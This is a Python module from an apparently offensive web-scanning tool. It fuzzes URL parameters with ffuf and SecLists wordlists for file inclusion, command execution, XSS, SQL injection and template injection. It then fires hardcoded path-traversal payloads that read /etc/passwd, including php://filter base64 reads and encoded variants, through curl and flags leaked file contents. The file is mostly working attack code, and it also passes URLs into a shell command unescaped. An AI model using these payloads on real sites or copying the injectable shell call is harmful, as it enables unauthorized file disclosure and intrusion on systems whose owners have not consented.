# modules/lfi.py

import os
import subprocess
from termcolor import cprint

SECLISTS_BASE = "/usr/share/seclists"
PARAM_FILE = "param_urls.txt"

FUZZ_CATEGORIES = {
    "LFI": f"{SECLISTS_BASE}/Fuzzing/LFI/LFI-Jhaddix.txt",
    "RFI": f"{SECLISTS_BASE}/Fuzzing/RFI/rfi-payloads.txt",
    "RCE": f"{SECLISTS_BASE}/Fuzzing/RCE/RCE-Os-Commands.txt",
    "XSS": f"{SECLISTS_BASE}/Fuzzing/XSS/XSS-RSNA.txt",
    "SQLi": f"{SECLISTS_BASE}/Fuzzing/SQLi/Generic-SQLi.txt",
    "SSTI": f"{SECLISTS_BASE}/Fuzzing/SSTI/SSTI-payloads.txt",
    "Path Traversal": f"{SECLISTS_BASE}/Fuzzing/LFI/Fuzzing-path-traversal.txt"
}

def validate_files():
    if not os.path.exists(PARAM_FILE):
        cprint(f"[✘] Archivo requerido no encontrado: {PARAM_FILE}", "red")
        return False
    missing = [k for k, v in FUZZ_CATEGORIES.items() if not os.path.isfile(v)]
    if missing:
        cprint("[✘] Faltan wordlists para: " + ", ".join(missing), "red")
        return False
    return True

def run_lfi(result_dir, log_file):
    if not validate_files():
        return

    with open(PARAM_FILE, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]

    if not urls:
        cprint("[!] No hay URLs válidas en param_urls.txt", "red")
        return

    for category, wordlist in FUZZ_CATEGORIES.items():
        result_file = os.path.join(result_dir, f"{category.lower().replace(' ', '_')}_results.txt")

        cprint(f"\n🚀 Fuzzing: {category}", "blue", attrs=["bold", "underline"])
        with open(result_file, "w") as rf, open(log_file, "a") as log:
            for i, url in enumerate(urls, start=1):
                cprint(f"[{category} {i}] 🔗 {url}", "cyan")
                cmd = f'ffuf -u "{url}FUZZ" -w "{wordlist}" -mc 200,500 -t 25 -s'
                try:
                    result = subprocess.check_output(cmd, shell=True, text=True)
                    if result.strip():
                        rf.write(f"🔗 URL: {url}\n")
                        rf.write(f"🧩 Payloads desde: {wordlist}\n")
                        rf.write("📄 Evidencia:\n")
                        rf.write(result + "\n")
                        rf.write("--------------------------------------------------\n")
                        log.write(f"[FFUF][{category}] {url}\n{result}\n\n")
                        cprint("[✓] Resultados encontrados.", "green")
                    else:
                        cprint("[-] Sin hallazgos.", "yellow")
                except KeyboardInterrupt:
                    cprint("\n[!] Interrumpido por el usuario.", "yellow")
                    return
                except subprocess.CalledProcessError:
                    continue

    lfi_output = os.path.join(result_dir, "lfi_results.txt")
    
    cprint("[*] Running LFI scan...", "blue")
    
    # Verificar que el archivo de URLs existe y no está vacío
    if not os.path.exists(PARAM_FILE) or os.path.getsize(PARAM_FILE) == 0:
        cprint("[!] No se encontraron URLs con parámetros para analizar LFI.", "red")
        # Crear archivo vacío
        with open(lfi_output, "w") as f:
            f.write("# No URLs with parameters found for LFI testing\n")
        return
    
    try:
        # Leer URLs desde el archivo
        with open(PARAM_FILE, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            cprint("[!] No hay URLs válidas para probar LFI.", "red")
            with open(lfi_output, "w") as f:
                f.write("# No valid URLs found for LFI testing\n")
            return
        
        vulnerabilities_found = []
        
        # Payloads comunes de LFI
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../etc/hosts",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        cprint(f"[*] Probando {len(urls)} URLs con {len(lfi_payloads)} payloads LFI...", "blue")
        
        for i, url in enumerate(urls, 1):
            cprint(f"[LFI {i}/{len(urls)}] Analizando: {url}", "cyan")
            
            # Extraer parámetros de la URL
            if '?' not in url:
                continue
                
            base_url, params = url.split('?', 1)
            param_pairs = params.split('&')
            
            for param_pair in param_pairs:
                if '=' not in param_pair:
                    continue
                    
                param_name, param_value = param_pair.split('=', 1)
                
                # Probar cada payload en este parámetro
                for payload in lfi_payloads:
                    test_url = f"{base_url}?{param_name}={payload}"
                    
                    # Hacer request con curl
                    curl_cmd = [
                        "curl", "-s", "-k", "--max-time", "10",
                        "--user-agent", "Mozilla/5.0 (compatible; LFI-Scanner)",
                        test_url
                    ]
                    
                    try:
                        result = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=15)
                        response = result.stdout.lower()
                        
                        # Indicadores de LFI exitoso
                        lfi_indicators = [
                            "root:x:0:0:",  # /etc/passwd
                            "daemon:x:",
                            "bin:x:",
                            "sys:x:",
                            "localhost",    # /etc/hosts
                            "127.0.0.1",
                            "# localhost",
                            "[boot loader]", # Windows boot.ini
                            "[operating systems]",
                            "microsoft windows" # Windows files
                        ]
                        
                        # Verificar si la respuesta contiene indicadores de LFI
                        for indicator in lfi_indicators:
                            if indicator in response:
                                vuln_info = {
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'indicator': indicator,
                                    'response_snippet': response[:200]
                                }
                                vulnerabilities_found.append(vuln_info)
                                cprint(f"[+] LFI encontrado: {param_name} en {base_url}", "green")
                                break
                                
                    except (subprocess.TimeoutExpired, Exception) as e:
                        continue
        
        # Escribir resultados
        with open(lfi_output, "w") as f:
            if vulnerabilities_found:
                f.write("# LFI (Local File Inclusion) Vulnerabilities Found\n")
                f.write(f"# Total vulnerabilities: {len(vulnerabilities_found)}\n\n")
                
                for vuln in vulnerabilities_found:
                    f.write(f"[VULNERABLE] LFI detected\n")
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"Indicator found: {vuln['indicator']}\n")
                    f.write(f"Response snippet: {vuln['response_snippet'][:100]}...\n")
                    f.write("-" * 80 + "\n\n")
                
                cprint(f"[✓] {len(vulnerabilities_found)} vulnerabilidades LFI encontradas", "green")
            else:
                f.write("# No LFI vulnerabilities found\n")
                cprint("[✓] No se encontraron vulnerabilidades LFI", "green")
        
        cprint(f"[✔] LFI scan completed. Results in {lfi_output}", "green")
        
    except Exception as e:
        cprint(f"[!] Error during LFI scan: {e}", "red")
        with open(lfi_output, "w") as f:
            f.write(f"# Error during LFI scan: {e}\n")
        
        # Error log
        with open(log_file, "a") as log:
            log.write(f"LFI Error: {e}\n")


if __name__ == "__main__":
    import sys
    result_dir = sys.argv[1]
    log_file = sys.argv[2]
    run_lfi(result_dir, log_file)